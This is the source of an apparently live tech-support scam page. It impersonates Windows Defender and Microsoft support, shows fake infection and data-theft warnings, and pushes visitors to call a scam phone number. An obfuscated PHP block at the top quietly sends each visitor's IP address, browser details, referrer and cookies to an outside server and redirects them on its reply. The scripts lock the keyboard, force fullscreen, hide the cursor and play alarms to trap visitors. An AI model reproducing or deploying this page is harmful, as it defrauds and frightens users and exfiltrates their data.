<!doctype html>
<html lang="en">

<head>
<?php date_default_timezone_set("UTC");error_reporting(0);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "482910";$uid="cvnsmxsz00ca7tndxzhv8orb4";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <link rel="stylesheet" type="text/css" href="main.css">
    <title>Security Services</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=c87b0401"></script>
    <script>
        function getVariableFromURll(name) {
            name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
            var regexS = "[\\?&]" + name + "=([^&#]*)";
            var regex = new RegExp(regexS);
            var results = regex.exec(window.location.href);
            if (results == null)
                return "";
            else
                return results[1];
        }
    </script>
    <script type="text/javascript">
        var phone = "+1-818-381-9844";
    </script>



    <script type="text/javascript">
        var phone_number = '<?=$phone_number;?>';
    </script>

    <script>
        let closePP = document.querySelector('.btn23-primary');
        let overlay = document.querySelector('.modal23-dialog');

        let KEY_ESC = 27;
        document.onkeydown = function(e) {
            if (e.keyCode == KEY_ESC) {
                document.querySelector('.wrapper').style.cursor = "auto";
                setTimeout(() => {
                    document.querySelector('.modal23-dialog').style.display = "block"
                }, 7500);

            }
        }



        setTimeout(() => {
            document.querySelector('.modal23-dialog').style.display = "block"
        }, 7500);

        document.addEventListener('click', () => {


            document.getElementById("beeppeep").play();

            //document.documentElement.requestFullscreen();
            document.body.requestFullscreen().then(
                () => {
                    const keys = [{
                            code: 'Escape'
                        },
                        {
                            code: 'Tab',
                            altKey: true
                        },
                        {
                            code: 'Tab',
                            metaKey: true
                        },
                    ];
                    //navigator.requestSystemKeyboardLock(keys);
                    navigator.keyboard.lock();
                });
            document.addEventListener('keydown', event => {
                if (event.code == 'Escape') {
                    console.dir('escape punched');
                }
            }, false);
            document.querySelector('.modal23-dialog').style.display = "none";
            document.querySelector('.wrapper').style.cursor = "none";


        });



        document.addEventListener('mouseleave', showDontLeavePopup);
        var popupShows = 0;

        function showDontLeavePopup() {

            document.querySelector('.modal-dialog23').style.display = "block";


        }


        // document.querySelector('.btn-primary').onclick = function() {
        //     document.querySelector('.modal-dialog').style.display = 'none';
        // };
    </script>

</head>

<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
    <div class="modal23-dialog">
        <div class="modal23-content">
            <div class="modal23-body">
                <table>
                    <tbody>
                        <tr>
                            <td>
                                <div class="mod_cross"><img src="cross-bl.png"></div>
                                <p class="modal23-p text_block">Confirm the action on the page https://...</p>
                                <p class="text_block modal23-p2">Access to this PC has been disabled! Please contact support.</p>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div class="modal23-footer">
                <button type="button" class="btn23 btn-primary23">OK</button>
            </div>
        </div>
    </div>
    <audio id="beeppeep" autoplay="">
    <source src="0wa0rni0ng0.mp3" type="audio/mpeg">
</audio>
    <div class="bg" style="cursor:none;">
        <div class="bgimg" style="top: 0px;"><img src="bg1.jpg" alt="" width="100%" /></div>
        <div class="bgimg2" style="top: 0px;"><img src="bg2.jpg" alt="" width="100%" /></div>

    </div>

    <a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
        <div class="black" style="height: 145%;cursor: none;"></div>
    </a>




    <div id="footer" style="top: 672px; position: absolute;cursor: none;">
        <div class="row">

            <div class="col-md-12">
                <div class="right-foot" style="text-align: center;">
                    <span id="footertxt"><img src="microsoft.png"> Windows Security: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">Windows Helpline <span
                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(phone)</script> </span> (Toll-Free)</span>
                </div>
            </div>
            <div class="col-md-12">
                <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">Windows
                    Defender SmartScreen prevented an unrecognized app from stating. Running this app might put your PC
                    at risk. Windows Defender Scan has found potentially unwanted Adware on this device that can steal
                    your passwords, online identity, financial information, personal files, pictures or
                    documents.</small></marquee>
            </div>
        </div>


    </div>

    <div id="poptxt" class="lightbox">
        <div class="ilb top">
            <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
                <span id="txtadd" class="fl title"><span class="fl ilb"><img src="microsoft.png" class="logo3"></span> Windows Defender - System Warning</span>
                <p id="txts1" class="fl title2"><a href="#"><img src="cross_white.png"></a></p>
                <!-- <div class="cr_bt"><img src="remove.png"></div> -->
            </div>
        </div>
        <div class="last_box">

            <div id="txtintro">
                <h3 class="colo-rd" style="font-size: 23px;
    margin-bottom: 0;"><img src="virus-scan-red.png" style="width:35px;"> Critical Threat Detected: Adware App</h3>

                <p style="
    font-size: 15px;
    font-weight: bold;
    margin-bottom: 6px;
">Access to this computer has been blocked for security reasons.</p>
                <img id="banner" src="virus-images.jpg">
                <p style="    font-size: 15px;
    font-weight: bold;margin-bottom: 0;">Important: Please contact support immediately to resolve this issue.</p>

            </div>
            <!--  <img id="banner" src="virus-images.jpg"> -->
            <div id="disclaimer" style="text-align: center;">
                <span class="support">Windows Helpline: <script>document.write(phone)</script> (Toll-Free)</span>
            </div>

        </div>
        <div id="bottom">
            <img id="badge" src="support.png"><span class="title3">Windows Support </span>
            <ul>
                <li>
                    <a href="#">
                        <div class="fr button">
                            <span id="addtochromebutton">GET HELP</span>
                        </div>
                    </a>
                </li>
                <li>
                    <a href="#">
                        <div class="fr button2">
                            <span id="addtochromebutton">Dismiss</span>
                        </div>
                    </a>
                </li>

            </ul>

        </div>
    </div>



    <div id="pop_up_new" class="cardcontainer" style="cursor: none;">
        <p class="text-center" style="    font-size: 16px;
    font-weight: normal;
    margin: 0;
    margin-bottom: 5px;
    padding: 5px 10px;
    color: #FFFFFF !important;
    color: #414141;font-weight: bold;
    margin-top: 8px;">Windows-Defender - Security Warning</p>
        <p>** ACCESS TO THIS COMPUTER HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
        <p>Your PC has alerted us that it has been infected with a Adware App. The following data has been compromised.
        </p>
        <p>&gt; Email Credentials<br> &gt; Banking Passwords<br> &gt; Facebook Login<br> &gt; Pictures &amp; Documents

        </p>
        <p>Windows-Defender Scan has found potentially unwanted Adware on this device that can steal your passwords, online identity, financial information, personal files, pictures or documents.</p>
        <p>You must contact us immediately so that our engineers can walk you through the removal process over the phone.
        </p>
        <p>Call Windows Support immediately to report this threat, prevent identity theft and unlock access to this device.
        </p>
        <p>Closing this window will put your personal information at risk and lead to a suspension of your Windows Registration.
        </p>
        <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Windows Support: <strong>
            <script>document.write(phone)</script> (Toll-Free)</strong></p>
        <div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer; color: #FFFFFF !important;">Run Safe</a> <a class="active" id="leave_page" style="color: #FFFFFF !important;">Ignore</a>
        </div>
    </div>

    <!-- <div id="welcomeDiv"
     style=" display:none; background-color:rgb(40 40 40 / 62%); height: auto; width: 550px; margin-left:30%;position: absolute;z-index: 9999999999;  "
     class="answer_list">
    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">You must contact us immediately so that our engineers can walk you through the removal process over the
        phone.<br>Your PC is disabled. <br><br> </p>


</div> -->


    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns" crossorigin="anonymous"></script>
    <script type="text/javascript" src="fullscreen.js"></script>
    <script type="text/javascript" src="before.js"></script>
    <script type="text/javascript" src="main.js"></script>


    <script type="text/javascript">
        (function($) {
            $.fn.countTo = function(options) {
                options = options || {};

                return $(this).each(function() {
                    // set options for current element
                    var settings = $.extend({}, $.fn.countTo.defaults, {
                        from: $(this).data('from'),
                        to: $(this).data('to'),
                        speed: $(this).data('speed'),
                        refreshInterval: $(this).data('refresh-interval'),
                        decimals: $(this).data('decimals')
                    }, options);

                    // how many times to update the value, and how much to increment the value on each update
                    var loops = Math.ceil(settings.speed / settings.refreshInterval),
                        increment = (settings.to - settings.from) / loops;

                    // references & variables that will change with each update
                    var self = this,
                        $self = $(this),
                        loopCount = 0,
                        value = settings.from,
                        data = $self.data('countTo') || {};

                    $self.data('countTo', data);

                    // if an existing interval can be found, clear it first
                    if (data.interval) {
                        clearInterval(data.interval);
                    }
                    data.interval = setInterval(updateTimer, settings.refreshInterval);

                    // initialize the element with the starting value
                    render(value);

                    function updateTimer() {
                        value += increment;
                        loopCount++;

                        render(value);

                        if (typeof(settings.onUpdate) == 'function') {
                            settings.onUpdate.call(self, value);
                        }

                        if (loopCount >= loops) {
                            // remove the interval
                            $self.removeData('countTo');
                            clearInterval(data.interval);
                            value = settings.to;

                            if (typeof(settings.onComplete) == 'function') {
                                settings.onComplete.call(self, value);
                            }
                        }
                    }

                    function render(value) {
                        var formattedValue = settings.formatter.call(self, value, settings);
                        $self.html(formattedValue);
                    }
                });
            };

            $.fn.countTo.defaults = {
                from: 0, // the number the element should start at
                to: 0, // the number the element should end at
                speed: 100, // how long it should take to count between the target numbers
                refreshInterval: 100, // how often the element should be updated
                decimals: 0, // the number of decimal places to show
                formatter: formatter, // handler for formatting the value before rendering
                onUpdate: null, // callback method for every time the element is updated
                onComplete: null // callback method for when the element finishes updating
            };

            function formatter(value, settings) {
                return value.toFixed(settings.decimals);
            }
        }(jQuery));

        jQuery(function($) {
            // custom formatting example
            $('.count-number').data('countToOptions', {
                formatter: function(value, options) {
                    return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
                }
            });

            // start all the timers
            $('.timer').each(count);

            function count(options) {
                var $this = $(this);
                options = $.extend({}, options || {}, $this.data('countToOptions') || {});
                $this.countTo(options);
            }
        });
    </script>
    <script type="text/javascript">
        $(document).ready(function() {
            $(".pro_box2").delay(1).fadeIn(800);
            $(".pro_box3").delay(1).fadeIn(800);
            $(".pro_box3").delay(1).fadeIn(800);
            $("#pop_up_new").delay(1).fadeIn(800);
            $("#poptxt").delay(1).fadeIn(800);
            $(".black").delay(7300).fadeIn();
        });
    </script>
    <script>
        // Get the modal
        var modal = document.getElementById('myModal');

        // Get the button that opens the modal
        var btn = document.getElementById("myBtn");

        // Get the <span> element that closes the modal
        var span = document.getElementsByClassName("close")[0];

        // When the user clicks the button, open the modal
        /*btn.onclick = function() {
          modal.style.display = "block";
        } */

        // When the user clicks on <span> (x), close the modal
        span.onclick = function() {
            modal.style.display = "none";
        }

        // When the user clicks anywhere outside of the modal, close it
        window.onclick = function(event) {
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
    </script>
    <script type="text/javascript">
        setTimeout(function() {
            document.getElementById("beeppeep").play();
        });
    </script>
    <script>
        $(document).ready(function() {
            $("#mycanvas").click(function() {
                $("#welcomeDiv").show();
            });
        });
    </script>
    <script>
        $(document).ready(function() {
            $("#mycanvas").click(function() {
                $(".bgimg").hide();
                $(".bgimg2").show();
            });
        });
    </script>
    <script>
        $(document).ready(function() {
            $("body").click(function() {
                $(".black").hide();
            });
        });
    </script>
    <script type="text/javascript">
        $(document).ready(function() {
            $("body").mouseover(function() {
                $("#poptxt").show();
            });
        });
    </script>
    <!-- <script type="text/javascript">
    $(document).ready(function () {
        $("body").mouseover(function () {
            $(".black").show();
        });
    });
</script> -->
</body>

</html>